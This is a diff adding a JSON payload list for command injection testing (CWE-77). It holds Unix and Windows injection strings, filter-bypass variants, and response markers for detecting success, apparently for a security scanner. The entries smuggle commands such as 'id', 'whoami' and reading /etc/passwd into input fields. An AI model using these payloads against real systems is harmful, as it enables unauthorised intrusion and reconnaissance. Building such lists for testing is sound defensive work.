@@ -1,0 +1,13 @@
+{
+  "variants": {
+    "unix": ["; id", "| id", "$(id)", "`id`", "&& id", "|| id", ";id", "|id", ";cat /etc/passwd", "| cat /etc/passwd", "$(cat /etc/passwd)", "`cat /etc/passwd`", "; whoami", "| whoami", "; ls -la", "| ls -la"],
+    "windows": ["& whoami", "&& whoami", "| whoami", "& dir", "&& dir", "| dir", "%COMSPEC% /c whoami", "%WINDIR%\\system32\\whoami.exe"],
+    "filter_bypass": ["; w'h'o'a'm'i", "; who$()ami", "; w\\hoami", "; /???/??ami", "; /bin/sh -c id", "; /???/?????? -c id", "; {whoami}", "; whoami #", "; whoami//", "; whoami%00", "; whoami%0a", "|| i'd"]
+  },
+  "payloads": ["; id", "| id", "$(id)", "`id`", "&& whoami", "| whoami"],
+  "markers": ["uid=", "gid=", "groups=", "root:x:0:0", "[boot loader]", "Volume in drive", "Directory of", "Total bytes"],
+  "metadata": {
+    "cwe": "CWE-77",
+    "technique": "Command injection"
+  }
+}
